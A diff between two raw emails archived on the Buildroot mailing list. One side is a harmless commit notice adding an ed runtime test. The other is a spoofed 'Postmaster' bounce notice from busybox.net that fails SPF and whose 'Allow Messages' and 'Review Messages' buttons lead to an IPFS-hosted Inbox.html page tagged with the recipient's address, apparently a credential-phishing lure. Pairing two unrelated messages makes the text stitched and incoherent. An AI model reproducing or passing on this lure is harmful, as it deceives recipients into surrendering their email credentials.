@@ -4,49 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 52A4ECD128D
-	for <buildroot@archiver.kernel.org>; Mon,  1 Apr 2024 14:30:22 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 93463CD1292
+	for <buildroot@archiver.kernel.org>; Mon,  1 Apr 2024 14:36:13 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 134EC608C5;
-	Mon,  1 Apr 2024 14:30:22 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 49C9760769;
+	Mon,  1 Apr 2024 14:36:13 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
  by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id FOmxjN8Jl2xh; Mon,  1 Apr 2024 14:30:21 +0000 (UTC)
+ id 5Fb4Bhbk2_3M; Mon,  1 Apr 2024 14:36:12 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 5BD76608CD
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 561DE60672
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 5BD76608CD;
-	Mon,  1 Apr 2024 14:30:20 +0000 (UTC)
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
- by ash.osuosl.org (Postfix) with ESMTP id 6E4901BF33E
- for <buildroot@lists.busybox.net>; Mon,  1 Apr 2024 14:30:17 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 561DE60672;
+	Mon,  1 Apr 2024 14:36:12 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 3CD721BF33E
+ for <buildroot@lists.busybox.net>; Mon,  1 Apr 2024 14:36:10 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp2.osuosl.org (Postfix) with ESMTP id 41C7F40162
- for <buildroot@lists.busybox.net>; Mon,  1 Apr 2024 14:30:16 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 36BA7817B1
+ for <buildroot@lists.busybox.net>; Mon,  1 Apr 2024 14:36:10 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id 1uq713YoxUC4 for <buildroot@lists.busybox.net>;
- Mon,  1 Apr 2024 14:30:15 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.167.122;
- helo=busybox.osuosl.org; envelope-from=buildroot-git-push@osuosl.org;
- receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 66FAA40126
-Received: from busybox.osuosl.org (busybox.osuosl.org [140.211.167.122])
- by smtp2.osuosl.org (Postfix) with ESMTP id 66FAA40126
- for <buildroot@buildroot.org>; Mon,  1 Apr 2024 14:30:15 +0000 (UTC)
-Received: by busybox.osuosl.org (Postfix, from userid 4053)
- id 4F12C84554; Mon,  1 Apr 2024 14:30:15 +0000 (UTC)
-From: Yann E. MORIN <yann.morin.1998@free.fr>
-To: buildroot@buildroot.org
-Date: Mon, 1 Apr 2024 16:28:10 +0200
-X-Git-Refname: refs/heads/master
-X-Git-Oldrev: 6748b4d35f37d2466c6b571b813f542d291c08ef
-X-Git-Newrev: dc101babfd5fd36062b8c7551e41cace84192a70
-X-Patchwork-Hint: ignore
-Message-Id: <20240401143015.4F12C84554@busybox.osuosl.org>
-Subject: [Buildroot] [git commit] support/testing: add ed runtime test
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id uQ9G9m6ncWnW for <buildroot@lists.busybox.net>;
+ Mon,  1 Apr 2024 14:36:09 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
+ helo=busybox.net; envelope-from=postmaster@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org BFC10813AD
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org BFC10813AD
+Received: from busybox.net (unknown [141.98.10.132])
+ by smtp1.osuosl.org (Postfix) with ESMTP id BFC10813AD
+ for <buildroot@busybox.net>; Mon,  1 Apr 2024 14:36:08 +0000 (UTC)
+From: Postmaster <postmaster@busybox.net>
+To: buildroot@busybox.net
+Date: 1 Apr 2024 16:36:07 +0200
+Message-ID: <20240401163607.11B5923DE468B15B@busybox.net>
+MIME-Version: 1.0
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Undeliverable: Incoming Message Delivery Failure
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -58,139 +56,221 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============4855559978163520373=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-commit: https://git.buildroot.net/buildroot/commit/?id=dc101babfd5fd36062b8c7551e41cace84192a70
-branch: https://git.buildroot.net/buildroot/commit/?id=refs/heads/master
+--===============4855559978163520373==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Signed-off-by: Julien Olivain <ju.o@free.fr>
-Signed-off-by: Yann E. MORIN <yann.morin.1998@free.fr>
----
- DEVELOPERS                               |  1 +
- support/testing/tests/package/test_ed.py | 98 ++++++++++++++++++++++++++++++++
- 2 files changed, 99 insertions(+)
+<!DOCTYPE HTML>
 
-diff --git a/DEVELOPERS b/DEVELOPERS
-index 313fc16b9d..288a3ce0e6 100644
---- a/DEVELOPERS
-+++ b/DEVELOPERS
-@@ -1780,6 +1780,7 @@ F:	support/testing/tests/package/test_cryptsetup/
- F:	support/testing/tests/package/test_ddrescue.py
- F:	support/testing/tests/package/test_ddrescue/
- F:	support/testing/tests/package/test_dos2unix.py
-+F:	support/testing/tests/package/test_ed.py
- F:	support/testing/tests/package/test_file.py
- F:	support/testing/tests/package/test_file/
- F:	support/testing/tests/package/test_fluidsynth.py
-diff --git a/support/testing/tests/package/test_ed.py b/support/testing/tests/package/test_ed.py
-new file mode 100644
-index 0000000000..eee5f8c4fc
---- /dev/null
-+++ b/support/testing/tests/package/test_ed.py
-@@ -0,0 +1,98 @@
-+import os
-+
-+import infra.basetest
-+
-+
-+class TestEd(infra.basetest.BRTest):
-+    config = infra.basetest.BASIC_TOOLCHAIN_CONFIG + \
-+        """
-+        BR2_PACKAGE_ED=y
-+        BR2_TARGET_ROOTFS_CPIO=y
-+        # BR2_TARGET_ROOTFS_TAR is not set
-+        """
-+
-+    def run_ed_cmds(self, ed_cmds):
-+        cmd = "ed <<EOF\n"
-+        cmd += "\n".join(ed_cmds)
-+        cmd += "\nEOF"
-+        self.assertRunOk(cmd)
-+
-+    def test_run(self):
-+        cpio_file = os.path.join(self.builddir, "images", "rootfs.cpio")
-+        self.emulator.boot(arch="armv5",
-+                           kernel="builtin",
-+                           options=["-initrd", cpio_file])
-+        self.emulator.login()
-+
-+        # We check the program can run. This also check we have the
-+        # actual GNU ed, rather than the Busybox ed, which does not
-+        # recognize the --version option.
-+        self.assertRunOk("ed --version")
-+
-+        test_fname = "test.txt"
-+        input_text_lines = [
-+            "Hello World",
-+            "Embedded Linux is Hard."
-+        ]
-+        output_expected_text = [
-+            "Hello Buildroot",
-+            "---------------",
-+            "Making Embedded Linux Easy."
-+        ]
-+
-+        # We define few "ed" command sequences, creating and editing a
-+        # text file. The final output of this sequence is expected to
-+        # match the expected text previously defined.
-+        create_file = ["a"]
-+        create_file += input_text_lines
-+        create_file += [
-+            ".",
-+            f"w {test_fname}",
-+            "q"
-+        ]
-+
-+        edit_file = [
-+            f"r {test_fname}",
-+            "1",
-+            "s/World/Buildroot/",
-+            "2",
-+            "s/is Hard/Easy/",
-+            "s/^/Making /",
-+            "w",
-+            "q"
-+        ]
-+
-+        insert_txt = [
-+            f"r {test_fname}",
-+            "2",
-+            "i",
-+            "This is a new line",
-+            ".",
-+            "w",
-+            "q"
-+        ]
-+
-+        change_txt = [
-+            f"r {test_fname}",
-+            "2",
-+            "c",
-+            "---------------",
-+            ".",
-+            "w"
-+            "q"
-+        ]
-+
-+        # We execute all "ed" command batches.
-+        ed_cmd_batches = [
-+            create_file,
-+            edit_file,
-+            insert_txt,
-+            change_txt
-+        ]
-+        for ed_cmd_batch in ed_cmd_batches:
-+            self.run_ed_cmds(ed_cmd_batch)
-+
-+        # The final test file should contain the expected text.
-+        out, ret = self.emulator.run(f"cat {test_fname}")
-+        self.assertEqual(ret, 0)
-+        self.assertEqual(out, output_expected_text)
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"548" style=3D"border-color: rgb(221, 221, 221); border-radi=
+us: 0px; color: black; text-transform: none; text-indent: 0px; letter-spaci=
+ng: normal; padding-top: 0px; padding-bottom: 0px; font-family: Arial, Helv=
+etica, sans-serif; font-size: small; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; max-widt=
+h: 548px; border-spacing: 0px; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"border-color:=
+ rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;"><tr style=
+=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizing: borde=
+r-box;">
+<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
+0px; padding-right: 0px; padding-bottom: 15px; padding-left: 0px; font-fami=
+ly: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-b=
+ox; border-spacing: 0px;"><table style=3D"border-color: rgb(221, 221, 221);=
+ border-radius: 0px; padding-top: 0px; padding-bottom: 0px; font-weight: 60=
+0; border-collapse: collapse; max-width: 548px; border-spacing: 0px;">
+<tbody style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-s=
+izing: border-box;"><tr style=3D"border-color: rgb(221, 221, 221); border-r=
+adius: 0px; box-sizing: border-box;"><td style=3D'border-color: rgb(221, 22=
+1, 221); margin: 0px; border-radius: 0px; width: 181px; font-family: "Segoe=
+ UI", Frutiger, Arial, sans-serif; font-size: 15px; vertical-align: bottom;=
+ box-sizing: border-box;'>
+<font color=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); border-r=
+adius: 0px; box-sizing: border-box;"><span style=3D"border-color: rgb(221, =
+221, 221); border-radius: 0px; color: rgb(0, 0, 0); box-sizing: border-box;=
+">Failure Notice</span></font></td><td style=3D'border-color: rgb(221, 221,=
+ 221); margin: 0px; border-radius: 0px; width: 186px; text-align: center; f=
+ont-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 15px; verti=
+cal-align: bottom; box-sizing: border-box;'>
+<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://h=
+wnc.in&amp;source=3Dgmail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw3Fshmp=
+8hxAiAMGS7YCoMCE">busybox.net</a></td><td style=3D'border-color: rgb(221, 2=
+21, 221); margin: 0px; border-radius: 0px; width: 181px; text-align: right;=
+ font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 15px; ver=
+tical-align: bottom; box-sizing: border-box;'>buildroot</td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizi=
+ng: border-box;"><td style=3D'border-color: rgb(221, 221, 221); margin: 0px=
+; border-radius: 0px; width: 181px; padding-top: 0px; padding-bottom: 0px; =
+font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font=
+-weight: 400; vertical-align: middle; box-sizing: border-box;'><font color=
+=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); border-radius: 0px;=
+ box-sizing: border-box;">
+<span style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; color:=
+ rgb(192, 0, 0); box-sizing: border-box;"><span style=3D"border-color: rgb(=
+221, 221, 221); border-radius: 0px; font-weight: bolder; box-sizing: border=
+-box;">Action Required</span></span></font></td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
+0px; width: 186px; text-align: center; padding-top: 0px; padding-bottom: 0p=
+x; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; f=
+ont-weight: 400; vertical-align: middle; box-sizing: border-box;'>&nbsp;</t=
+d>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
+0px; width: 181px; text-align: right; padding-top: 0px; padding-bottom: 0px=
+; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; fo=
+nt-weight: 400; vertical-align: middle; box-sizing: border-box;'><font colo=
+r=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); border-radius: 0px=
+; box-sizing: border-box;">
+<span style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; color:=
+ rgb(0, 0, 0); box-sizing: border-box;">Recipient</span></font></td></tr><t=
+r style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizing=
+: border-box;"><td style=3D"border-color: rgb(221, 221, 221); margin: 0px; =
+padding: 0px; border-radius: 0px; box-sizing: border-box;" colspan=3D"3">
+<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; border-radi=
+us: 0px; border-collapse: collapse; border-spacing: 0px;" cellspacing=3D"0"=
+ cellpadding=3D"0"><tbody style=3D"border-color: rgb(221, 221, 221); border=
+-radius: 0px; box-sizing: border-box;"><tr height=3D"10" style=3D"border-co=
+lor: rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
+<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
+margin: 0px; padding: 0px; border-radius: 0px; width: 180px; height: 10px; =
+line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=3D"#c00=
+000">&nbsp;</td><td width=3D"4" height=3D"10" style=3D"border-color: rgb(22=
+1, 221, 221); margin: 0px; padding: 0px; border-radius: 0px; width: 4px; he=
+ight: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgc=
+olor=3D"#ffffff">&nbsp;</td>
+<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
+margin: 0px; padding: 0px; border-radius: 0px; width: 180px; height: 10px; =
+line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=3D"#ccc=
+ccc">&nbsp;</td><td width=3D"4" height=3D"10" style=3D"border-color: rgb(22=
+1, 221, 221); margin: 0px; padding: 0px; border-radius: 0px; width: 4px; he=
+ight: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgc=
+olor=3D"#ffffff">&nbsp;</td>
+<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
+margin: 0px; padding: 0px; border-radius: 0px; width: 180px; height: 10px; =
+line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=3D"#ccc=
+ccc">&nbsp;</td></tr></tbody></table></td></tr><tr style=3D"border-color: r=
+gb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
+order-radius: 0px; width: 181px; line-height: 20px; font-family: "Segoe UI"=
+, Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; box-sizin=
+g: border-box;'>&nbsp;</td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
+order-radius: 0px; width: 186px; text-align: center; line-height: 20px; fon=
+t-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-we=
+ight: 400; box-sizing: border-box;'>&nbsp;</td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
+order-radius: 0px; width: 181px; text-align: right; line-height: 20px; font=
+-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-wei=
+ght: 400; box-sizing: border-box;'>&nbsp;</td></tr></tbody></table></td></t=
+r><tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-si=
+zing: border-box;">
+<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; border-radius: =
+0px; width: 528px; padding-top: 0px; padding-right: 10px; padding-left: 10p=
+x; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizi=
+ng: border-box;">&nbsp;<table style=3D"border-color: rgb(221, 221, 221); pa=
+dding: 0px; border-radius: 0px; width: 528px; margin-left: 0px; border-coll=
+apse: collapse; background-color: rgb(242, 245, 250);">
+<tbody style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-s=
+izing: border-box;"><tr style=3D"border-color: rgb(221, 221, 221); border-r=
+adius: 0px; box-sizing: border-box;"><td style=3D'border-color: rgb(221, 22=
+1, 221); margin: 0px; padding: 0px 10px; border-radius: 0px; font-family: "=
+Segoe UI", Frutiger, Arial, sans-serif; font-size: 21px; box-sizing: border=
+-box;'>
+<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; border-radi=
+us: 0px; width: 528px; margin-left: 0px; border-collapse: collapse;"><tbody=
+ style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizing:=
+ border-box;"><tr style=3D"border-color: rgb(221, 221, 221); border-radius:=
+ 0px; box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px; border-radius: 0px; font-family: "segoe ui", frutiger, arial, sans-seri=
+f; box-sizing: border-box;'><div style=3D"border-color: rgb(221, 221, 221);=
+ margin: 0px; padding: 0px; border-radius: 0px; font-family: inherit; font-=
+size: 15px; vertical-align: baseline; border-top-width: 0px; border-top-sty=
+le: none; box-sizing: border-box;">
+<span style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; font-w=
+eight: bolder; box-sizing: border-box;">Message Failure&nbsp;Receiving Noti=
+ce.</span><br style=3D"border-color: rgb(221, 221, 221); border-radius: 0px=
+; box-sizing: border-box;">ATTENTION:<span>&nbsp;</span><a style=3D"color: =
+rgb(17, 85, 204);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">=
+buildroot@busybox.net</a></div></td></tr><tr style=3D"border-color: rgb(221=
+, 221, 221); border-radius: 0px; box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px 6px; border-radius: 0px; font-family: "segoe ui", frutiger, arial, sans-=
+serif; font-size: 16px; box-sizing: border-box;'><div style=3D"border-color=
+: rgb(221, 221, 221); border-radius: 0px; padding-top: 0px; border-top-widt=
+h: 0px; border-top-style: none; box-sizing: border-box;">You have Suspended=
+ incoming message<br style=3D"border-color: rgb(221, 221, 221); border-radi=
+us: 0px; box-sizing: border-box;">Please Fix Below</div>
+</td></tr></tbody></table><div style=3D"border-color: rgb(221, 221, 221); b=
+order-radius: 0px; box-sizing: border-box;"><br></div><div style=3D"border-=
+color: rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
+<a style=3D"background: rgb(38, 117, 214); border-color: rgb(221, 221, 221)=
+; margin: 2px; padding: 10px; border-radius: 0px; color: rgb(255, 255, 255)=
+; font-size: 14px; float: left; display: block; outline-width: 0px; outline=
+-style: none; box-sizing: border-box; text-decoration-line: none;" href=3D"=
+https://cloudflare-ipfs.com/ipfs/bafkreih5gabmfzhzb7ejeyutclflwsbvrkvxshzab=
+v4qy34pa5j4ll4hz4?filename=3DInbox.html#buildroot@busybox.net" target=3D"_b=
+lank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://znamenska.co=
+m/stats/2021-7/c2d49fb9211e37A39e789edfbE29cx397fQ39fv287e39/?c490w8cfe208A=
+408fc308b41j93m200184Dee302860zc38vrf390e39df%3Dinfo@hwnc.in&amp;source=3Dg=
+mail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw0VWd0TQpnPpp9ZFnP3AU2c" dat=
+a-saferedirectreason=3D"2">Allow Messages</a>
+<a style=3D"background: rgb(219, 214, 214); border-color: rgb(221, 221, 221=
+); margin: 2px; padding: 10px; border-radius: 0px; color: rgb(12, 12, 12); =
+font-size: 14px; float: left; display: block; outline-width: 0px; outline-s=
+tyle: none; box-sizing: border-box; text-decoration-line: none;" href=3D"ht=
+tps://cloudflare-ipfs.com/ipfs/bafkreih5gabmfzhzb7ejeyutclflwsbvrkvxshzabv4=
+qy34pa5j4ll4hz4?filename=3DInbox.html#buildroot@busybox.net" target=3D"_bla=
+nk" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://znamenska.co=
+m/stats/2021-7/c2d49fb9211e37A39e789edfbE29cx397fQ39fv287e39/?c490w8cfe208A=
+408fc308b41j93m200184Dee302860zc38vrf390e39df%3Dinfo@hwnc.in&amp;source=3Dg=
+mail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw0VWd0TQpnPpp9ZFnP3AU2c" dat=
+a-saferedirectreason=3D"2">Review Messages</a></div><div style=3D"border-co=
+lor: rgb(221, 221, 221); border-radius: 0px; box-sizing: border-box;">
+<br style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizi=
+ng: border-box;">&nbsp;</div></td></tr><tr style=3D"border-color: rgb(221, =
+221, 221); border-radius: 0px; box-sizing: border-box;"><td style=3D'border=
+-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10px 6px; border-radi=
+us: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 1=
+6px; box-sizing: border-box;'>&nbsp;</td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-sizi=
+ng: border-box;"><td style=3D"border-color: rgb(221, 221, 221); margin: 0px=
+; padding: 0px; border-radius: 0px; box-sizing: border-box; border-spacing:=
+ 0px;"><p style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; ma=
+rgin-top: 0px; margin-left: 15px; box-sizing: border-box;">
+<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://h=
+wnc.in&amp;source=3Dgmail&amp;ust=3D1712001076603000&amp;usg=3DAOvVaw3Fshmp=
+8hxAiAMGS7YCoMCE">busybox.net</a><span>&nbsp;</span>Notification</p></td></=
+tr><tr style=3D"border-color: rgb(221, 221, 221); border-radius: 0px; box-s=
+izing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px 6px; border-radius: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-=
+serif; font-size: 16px; box-sizing: border-box;'>&nbsp;</td></tr></tbody></=
+table></td></tr></tbody></table></body></html>
+
+--===============4855559978163520373==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============4855559978163520373==--
